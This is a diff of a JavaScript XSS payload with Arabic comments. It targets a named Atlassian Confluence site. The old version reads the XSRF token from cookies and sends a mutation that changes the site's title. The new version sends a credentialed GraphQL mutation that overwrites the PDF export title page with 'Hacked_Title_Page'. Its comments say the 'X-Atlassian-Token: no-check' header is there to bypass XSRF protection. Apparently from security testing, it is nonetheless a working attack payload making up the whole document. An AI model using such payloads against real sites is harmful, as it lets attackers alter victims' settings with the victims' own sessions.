@@ -1,70 +1,53 @@
-function loadDoc1() {
-  // 1. محاولة استخراج توكن الـ XSRF من الصفحة
-  // غالبًا ما يكون موجودًا في وسم meta أو في الكوكيز المتاحة
-  var xsrfToken = "";
-  var nameEQ = "atlassian.xsrf.token=";
-  var ca = document.cookie.split(';');
-  for(var i=0;i < ca.length;i++) {
-    var c = ca[i].trim();
-    if (c.indexOf(nameEQ) == 0) xsrfToken = c.substring(nameEQ.length,c.length);
-  }
-
+function updatePdfConfig() {
   var xhttp = new XMLHttpRequest();
-  var url = "https://anshall.atlassian.net/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";
+  // الرابط بناءً على طلبك الأخير
+  var url = "https://anshall.atlassian.net/cgraphql?q=PdfExportPageUpdatePdfExportConfigurationMutation";
 
   xhttp.open("POST", url, true);
 
-  // الرؤوس الأساسية
+  // إعداد الرؤوس (Headers) الهامة جداً لنجاح هذا الطلب تحديداً
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.setRequestHeader("Accept", "*/*");
   
-  // الرؤوس الأمنية المطلوبة لتجاوز حماية Atlassian
+  // الرؤوس المخصصة التي ظهرت في طلب الـ Burp Suite الخاص بك
+  xhttp.setRequestHeader("X-Apollo-Operation-Name", "PdfExportPageUpdatePdfExportConfigurationMutation");
+  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
+  
+  // تجاوز حماية الـ XSRF
   xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
-  if (xsrfToken) {
-    xhttp.setRequestHeader("X-XSRF-Token", xsrfToken);
-  }
 
   xhttp.withCredentials = true;
 
+  // بناء محتوى الطلب (Payload)
   var data = JSON.stringify([{
-    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
+    "operationName": "PdfExportPageUpdatePdfExportConfigurationMutation",
     "variables": {
-      "siteConfigInput": {
-        "siteTitle": "XSS SUCCESSFUL", // جرب اسماً واضحاً جداً للتأكد
-        "customContactMessage": "Modified via XSS",
-        "isContactAdministratorsFormEnabled": true,
-        "siteHomePage": "Confluence Home",
-        "isEditorConversionForSiteEnabled": true,
-        "isEditorFullWidthEnabled": false,
-        "isEmailNotificationEnabled": true,
-        "isPushNotificationEnabled": true,
-        "isLikesEnabled": true,
-        "timeFormat": "h:mm a",
-        "dateTimeFormat": "MMM dd, yyyy HH:mm",
-        "dateFormat": "MMM dd, yyyy",
-        "longNumberFormat": "###############",
-        "decimalNumberFormat": "###############.##########",
-        "maxAttachmentSize": 104857600,
-        "maxNumberOfAttachmentsPerUpload": 6,
-        "isExternalConnectionsEnabled": true,
-        "connectionTimeout": 10000,
-        "socketTimeout": 10000,
-        "globalDefaultLocale": "en_US",
-        "indexingLanguage": "english"
+      "input": {
+        "titlePage": "Hacked_Title_Page", // القيمة التي سيتم تغييرها
+        "header": "",
+        "footer": "",
+        "style": ""
       }
     },
-    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
+    "query": "mutation PdfExportPageUpdatePdfExportConfigurationMutation($input: ConfluenceUpdatePdfExportConfigurationInput!) {\n  confluence {\n    updatePdfExportConfiguration(input: $input) {\n      success\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      } \n      __typename\n    }\n    __typename\n  }\n}\n"
   }]);
 
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4) {
-      console.log("Response Status: " + this.status);
-      console.log("Full Response: " + this.responseText);
+      console.log("Status: " + this.status);
+      console.log("Response: " + this.responseText);
+      
+      // تحليل الرد للتأكد من النجاح
+      if (this.responseText.includes('"success":true')) {
+          console.log("✅ Mutation Successful!");
+      } else {
+          console.log("❌ Mutation Failed or returned errors.");
+      }
     }
   };
 
   xhttp.send(data);
 }
 
-loadDoc1();
-
+// تنفيذ العملية
+updatePdfConfig();
